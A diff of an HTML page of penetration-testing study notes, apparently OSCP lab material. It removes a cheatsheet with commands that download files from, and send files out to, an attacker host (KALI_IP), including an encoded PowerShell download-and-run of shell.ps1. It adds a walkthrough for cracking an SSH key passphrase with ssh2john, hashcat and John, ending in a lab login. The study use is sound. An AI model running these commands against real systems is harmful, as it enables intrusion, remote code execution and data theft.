@@ -3,12 +3,13 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>File Transfer - OSCP Notes</title>
+    <title>Web Fuzzing - AD Notes</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
+    <!-- NAVBAR -->
     <nav>
         <a href="index.html">Home</a>
 
@@ -107,226 +108,223 @@
         <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
         <div id="search-results" class="search-results collapsed"></div>
     </div>
+    <!-- CONTENT -->
+
     <div class="container">
 
-        <h1>File Transfer Cheatsheet (Kali ↔ Windows / Linux)</h1>
-
+        <!-- SSH PRIVATE KEY ATTACK -->
         <div class="section">
-            <div class="section-header">1. Kali → Windows (HTTP Method)</div>
+            <div class="section-header">SSH Private Key Passphrase Cracking</div>
             <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>certutil -urlcache -split -f http://KALI_IP/file.exe file.exe</code></pre>
-
-                <pre><code>iwr http://KALI_IP/file.exe -OutFile file.exe</code></pre>
-
-                <pre><code>powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','file.exe')"</code></pre>
+                <h3>Objective</h3>
+                <p>Recover the passphrase protecting an SSH private key to enable authentication to a remote system.</p>
 
             </div>
         </div>
 
+        <!-- HASH EXTRACTION -->
         <div class="section">
-            <div class="section-header">2. Kali → Windows (SMB Method)</div>
+            <div class="section-header">1. Extract and Format the Hash</div>
             <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>impacket-smbserver share . -smb2support -username kali -password kali</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>net use \\KALI_IP\share /user:kali kali
-copy file.exe \\KALI_IP\share\</code></pre>
-
-                Or download from share:
-
-                <pre><code>copy \\KALI_IP\share\file.exe file.exe</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">3. Windows → Kali (Netcat Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>nc -lvnp 9001 > file.exe</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>nc KALI_IP 9001 &lt; file.exe</code></pre>
-
-                If no nc on Windows:
-
-                <pre><code>type file.exe | nc KALI_IP 9001</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">4. Kali → Linux (HTTP Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80</code></pre>
-
-                <p><strong>On Linux victim:</strong></p>
-
-                <pre><code>wget http://KALI_IP/file.sh
-curl http://KALI_IP/file.sh -o file.sh</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">5. Linux → Kali (Netcat Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>nc -lvnp 9001 > file.txt</code></pre>
-
-                <p><strong>On Linux victim:</strong></p>
-
-                <pre><code>nc KALI_IP 9001 &lt; file.txt</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">6. SCP (If SSH Available)</div>
-            <div class="section-content">
-
-                <p><strong>From Kali to Linux:</strong></p>
-
-                <pre><code>scp file user@TARGET_IP:/tmp/</code></pre>
-
-                <p><strong>From Linux to Kali:</strong></p>
-
-                <pre><code>scp user@TARGET_IP:/tmp/file .</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">7. Base64 Transfer (When Nothing Works)</div>
-            <div class="section-content">
-
-                <p><strong>On victim:</strong></p>
-
-                <pre><code>base64 file.exe</code></pre>
-
-                Copy output manually.
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">8. PowerShell Encoded Download</div>
-            <div class="section-content">
-
-                <pre><code>powershell -enc BASE64COMMAND</code></pre>
-
-                Generate encoded command:
-
-                <pre><code>echo -n "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">9. FTP Quick Method</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>sudo python3 -m pyftpdlib -p 21</code></pre>
-
-                <p><strong>On victim:</strong></p>
-
-                <pre><code>ftp KALI_IP</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">10. OSCP Mental Quick Picks</div>
-            <div class="section-content">
-
+                <h3>Tool used</h3>
                 <ul>
-                    <li>Have PowerShell? → iwr</li>
-                    <li>No PowerShell? → certutil</li>
-                    <li>Linux? → wget</li>
-                    <li>No tools? → base64</li>
-                    <li>Need exfiltration? → netcat</li>
-                    <li>SMB open? → impacket-smbserver</li>
+                    <li>ssh2john (John the Ripper utility)</li>
+                </ul>
+
+                <h3>Command</h3>
+                <pre><code>ssh2john id_rsa > ssh.hash</code></pre>
+
+                <h3>Key points</h3>
+                <ul>
+                    <li>Converts private key into crackable hash format</li>
+                    <li>Output includes metadata such as encryption type</li>
+                    <li>"$6$" indicates SHA-512-based KDF</li>
                 </ul>
 
             </div>
         </div>
+
+        <!-- HASH TYPE IDENTIFICATION -->
         <div class="section">
-            <div class="section-header">11. Transfer Through Pivot (Ligolo / Tunnel)</div>
+            <div class="section-header">2. Identify Hashcat Mode</div>
             <div class="section-content">
 
-                <p>Cuando estás dentro de una red interna, NO puedes usar directamente tu IP de Kali.</p>
+                <h3>Search Hashcat modes</h3>
+                <pre><code>hashcat -h | grep -i ssh</code></pre>
 
-                <p><strong>Solución:</strong> usar el túnel (ej: Ligolo)</p>
+                <h3>Relevant modes</h3>
+                <ul>
+                    <li>22911 → OpenSSH private keys ($0$)</li>
+                    <li>22921 → OpenSSH private keys ($6$)</li>
+                    <li>22931 → OpenSSH private keys ($1, $3$)</li>
+                </ul>
 
-                <p><strong>Ejemplo:</strong> descargar desde Kali a máquina interna</p>
-
-                <pre><code>wget http://ATTACKER_TUN_IP/file.sh
-</code></pre>
-
-                <p>Tu IP será algo como:</p>
-
-                <pre><code>10.10.0.1 (interfaz ligolo)</code></pre>
-
-                <p><strong>Servidor en Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80 --bind 0.0.0.0
-</code></pre>
+                <h3>Selected mode</h3>
+                <p>Mode <strong>22921</strong> corresponds to "$6$" keys.</p>
 
             </div>
         </div>
 
+        <!-- PASSWORD POLICY ANALYSIS -->
         <div class="section">
-            <div class="section-header">12. Transfer Without Tools (Echo / Chunking)</div>
+            <div class="section-header">3. Analyze Password Policy</div>
             <div class="section-content">
 
-                <p>Cuando NO hay wget, curl, nc...</p>
+                <h3>From notes</h3>
+                <ul>
+                    <li>Minimum 3 numbers</li>
+                    <li>At least 1 uppercase letter</li>
+                    <li>At least 1 special character</li>
+                </ul>
 
-                <p><strong>En Kali:</strong></p>
-
-                <pre><code>base64 file.exe > file.b64
-</code></pre>
-
-                <p><strong>En víctima:</strong></p>
-
-                <pre><code>echo BASE64_PART >> file.b64
-</code></pre>
-
-                <p>Repetir por partes.</p>
-
-                <p><strong>Decodificar:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe
-</code></pre>
+                <h3>Observed patterns</h3>
+                <ul>
+                    <li>Numeric pattern example: 137</li>
+                    <li>Common capitalization at start</li>
+                    <li>Special characters often from: ! @ #</li>
+                </ul>
 
             </div>
         </div>
+
+        <!-- WORDLIST CREATION -->
+        <div class="section">
+            <div class="section-header">4. Prepare Wordlist</div>
+            <div class="section-content">
+
+                <h3>Example wordlist</h3>
+                <pre><code>Window
+rickc137
+dave
+superdave
+megadave
+umbrella</code></pre>
+
+                <h3>Strategy</h3>
+                <ul>
+                    <li>Use known user-related keywords</li>
+                    <li>Include previously observed passwords</li>
+                    <li>Leverage behavioral patterns of the user</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <!-- RULE CREATION -->
+        <div class="section">
+            <div class="section-header">5. Rule-Based Mutations</div>
+            <div class="section-content">
+
+                <h3>Custom rule file</h3>
+                <pre><code>c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#</code></pre>
+
+                <h3>Explanation</h3>
+                <ul>
+                    <li><code>c</code> → capitalize first letter</li>
+                    <li><code>$1 $3 $7</code> → append numbers</li>
+                    <li><code>$! $@ $#</code> → append special characters</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <!-- HASHCAT ATTEMPT -->
+        <div class="section">
+            <div class="section-header">6. Hashcat Attempt</div>
+            <div class="section-content">
+
+                <h3>Command</h3>
+                <pre><code>hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force</code></pre>
+
+                <h3>Issue encountered</h3>
+                <ul>
+                    <li>"Token length exception"</li>
+                    <li>Indicates unsupported format or cipher</li>
+                </ul>
+
+                <h3>Reason</h3>
+                <p>Some modern SSH keys use AES-256-CTR, which may not be supported by this mode.</p>
+
+            </div>
+        </div>
+
+        <!-- JOHN THE RIPPER -->
+        <div class="section">
+            <div class="section-header">7. Switching to John the Ripper</div>
+            <div class="section-content">
+
+                <h3>Why switch tools</h3>
+                <ul>
+                    <li>Better support for certain SSH key formats</li>
+                    <li>Handles more cipher variations</li>
+                </ul>
+
+                <h3>Rule integration</h3>
+                <pre><code>[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#</code></pre>
+
+                <h3>Add rules to configuration</h3>
+                <pre><code>sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'</code></pre>
+
+            </div>
+        </div>
+
+        <!-- CRACKING WITH JOHN -->
+        <div class="section">
+            <div class="section-header">8. Cracking with John</div>
+            <div class="section-content">
+
+                <h3>Command</h3>
+                <pre><code>john --wordlist=ssh.passwords --rules=sshRules ssh.hash</code></pre>
+
+                <h3>Result</h3>
+                <p>Recovered passphrase: <strong>Umbrella137!</strong></p>
+
+            </div>
+        </div>
+
+        <!-- SSH LOGIN -->
+        <div class="section">
+            <div class="section-header">9. Using the Cracked Passphrase</div>
+            <div class="section-content">
+
+                <h3>SSH login</h3>
+                <pre><code>ssh -i id_rsa -p 2222 dave@192.168.50.201</code></pre>
+
+                <h3>Outcome</h3>
+                <ul>
+                    <li>Passphrase entered successfully</li>
+                    <li>Access to remote system obtained</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <!-- KEY TAKEAWAYS -->
+        <div class="section">
+            <div class="section-header">Key Takeaways</div>
+            <div class="section-content">
+
+                <ul>
+                    <li>SSH private keys can be protected by passphrases that are crackable offline.</li>
+                    <li>ssh2john is used to convert keys into hash format.</li>
+                    <li>Correct hash mode selection is critical for cracking tools.</li>
+                    <li>Rule-based attacks should reflect observed user behavior and password policies.</li>
+                    <li>Tool limitations may require switching between Hashcat and John the Ripper.</li>
+                </ul>
+
+            </div>
+        </div>
+
     </div>
 
+    <!-- SCRIPT -->
     <script>
         document.querySelectorAll(".section-header").forEach(h => {
             h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
